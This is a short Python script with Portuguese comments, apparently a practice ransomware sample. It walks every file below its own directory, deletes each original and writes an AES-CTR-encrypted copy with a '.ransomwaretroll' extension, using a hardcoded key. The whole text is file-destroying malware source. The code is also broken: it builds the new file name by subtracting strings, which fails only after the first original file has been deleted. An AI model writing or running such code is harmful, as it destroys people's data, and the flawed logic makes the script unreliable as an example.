import os
import pyaes

# Pegar diretório atual do arquivo
current_directory = os.path.dirname(os.path.abspath(__file__))

# AES
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Percorrer árvore de diretórios a partir do diretório atual
for root, dirs, files in os.walk(current_directory):
    for file_name in files:
        file_path = os.path.join(root, file_name)
        
        # Abrir arquivo a ser encriptado
        with open(file_path, "rb") as file:
            file_data = file.read()
        
        # Remover arquivo original
        os.remove(file_path)
        
        # Encriptar arquivo
        crypto_data = aes.decrypt(file_data)
        
        # Escrever arquivo encriptado
        new_file_path = file_path - ".ransomwaretroll"
        with open(new_file_path, 'wb') as new_file:
            new_file.write(crypto_data)